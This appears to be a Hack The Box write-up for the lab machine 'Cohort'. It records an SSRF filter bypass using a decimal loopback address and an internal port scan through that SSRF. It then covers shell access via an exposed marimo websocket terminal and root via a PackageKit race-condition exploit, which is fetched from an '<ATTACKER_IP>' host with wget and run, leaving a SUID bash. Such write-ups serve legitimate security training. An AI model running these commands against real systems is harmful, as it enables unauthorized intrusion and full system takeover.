# Cohort

<img width="1597" height="281" alt="image" src="https://github.com/user-attachments/assets/cd9bc5f6-1366-4572-b603-6e8ea1bcee46" />

---

## namp Scan

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-07 08:20 UTC
Nmap scan report for cohort.htb (10.129.5.119)
Host is up (0.84s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-title: Cohort Analytics
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
| Not valid before: 2026-06-01T18:47:07
|_Not valid after:  2126-05-08T18:47:07
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.49 seconds

```

## i found in 

```
https://cohort.htb/portal.html
```

<img width="1919" height="725" alt="image" src="https://github.com/user-attachments/assets/d6a1cd93-dd99-4609-b669-3022f5e6acc7" />

## in source code found `/assets/app.js`

<img width="1919" height="721" alt="image" src="https://github.com/user-attachments/assets/73739c1d-7b27-48e9-91d8-8d724987d2d5" />

## in it found endpoints :

```
/api/validate
/api/fetch  
/api/report
/api/source
```

## found ssrf bypass 

```
curl -k -X POST "https://cohort.htb/api/validate" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://2130706433"}'
```

<img width="1681" height="255" alt="image" src="https://github.com/user-attachments/assets/32780db1-f00e-4e22-bb03-21b214d9bfce" />

## port scan 

```
for port in 22 80 443 3000 5000 8000 8080 9000 3306 6379 9200 9300 27017; do
    echo "Testing port $port"
    curl -k -s -X POST "https://cohort.htb/api/validate" \
      -H "Content-Type: application/json" \
      -d "{\"url\":\"http://2130706433:$port\"}" | grep -E "ok.*true|preview" | head -1
    echo ""
done

```

<img width="1714" height="496" alt="image" src="https://github.com/user-attachments/assets/6caf3e51-cb46-4d3b-b05f-349700e620ab" />

## found endpoint of port 80 /status

```
curl -k -s -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://2130706433/status"}' |
jq '.preview |= fromjson'
```

<img width="1068" height="538" alt="image" src="https://github.com/user-attachments/assets/6727da93-9ffb-4ad8-9166-aeb6bc3e8a18" />

## add it to `/etc/hosts`

```
echo "10.129.5.119 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
```

## found CVE to marimo 

# [CVE-2026-39987](https://github.com/advisories/GHSA-2679-6mx9-h9xc)

## download websocat

```
wget https://github.com/vi/websocat/releases/latest/download/websocat.x86_64-unknown-linux-musl -O websocat

chmod +x websocat

sudo mv websocat /usr/local/bin/

websocat --version

```

## now run

```
websocat -k \                                     
wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws

```

<img width="1102" height="296" alt="image" src="https://github.com/user-attachments/assets/3669b273-7054-450c-b879-69c8b0a4d748" />

---

Privilege escalation --- CVE-2026-41651 (Pack2TheRoot)
----------------------------------------------------

[](https://github.com/omchaturvedi0412/htb-writeups-cohort-README.md/blob/main/cohort.md#7-privilege-escalation--cve-2026-41651-pack2theroot)

`systemctl list-units` reveals `packagekit.service` present (D-Bus activated, inactive until called) --- vulnerable to CVE-2026-41651, a TOCTOU (time-of-check/time-of-use) race condition in PackageKit (`packagekitd`) affecting versions 1.0.2--1.3.4.

### Root cause

[](https://github.com/omchaturvedi0412/htb-writeups-cohort-README.md/blob/main/cohort.md#root-cause)

Three chained bugs in `src/pk-transaction.c`:

1.  `InstallFiles()` unconditionally overwrites cached transaction flags/paths with no state check.
2.  `pk_transaction_set_state()` silently drops backward state transitions.
3.  `pk_transaction_run()` reads the cached flags at dispatch time, not authorization time.
4.  Setting the `SIMULATE` flag bypasses the polkit authorization check entirely.

By sending two async D-Bus calls back-to-back --- first `InstallFiles(SIMULATE, dummy)` then immediately `InstallFiles(NONE, malicious_payload)` --- both messages are guaranteed to land before the GLib idle callback fires, deterministically bypassing authentication and causing the malicious `.deb` package to install as root.

### Exploitation

[](https://github.com/omchaturvedi0412/htb-writeups-cohort-README.md/blob/main/cohort.md#exploitation)

The target had no compiler (`gcc` missing), so the exploit was compiled locally and transferred:

```source-shell
# local machine
git clone https://github.com/Vozec/CVE-2026-41651.git
cd CVE-2026-41651
sudo apt install -y libglib2.0-dev build-essential
gcc src/cve-2026-41651.c -o cve-2026-41651\
  $(pkg-config --cflags --libs glib-2.0 gio-2.0 gobject-2.0)
python3 -m http.server 9002
```

```source-shell
# via marimo websocket shell
cd /tmp/exploit
wget http://<ATTACKER_IP>:9002/cve-2026-41651 -O cve-2026-41651
chmod +x cve-2026-41651
./cve-2026-41651
```

```
/tmp/.suid_bash -p
id
```

<img width="1028" height="199" alt="image" src="https://github.com/user-attachments/assets/6750c4f2-6b43-4064-9986-8144b01a4198" />

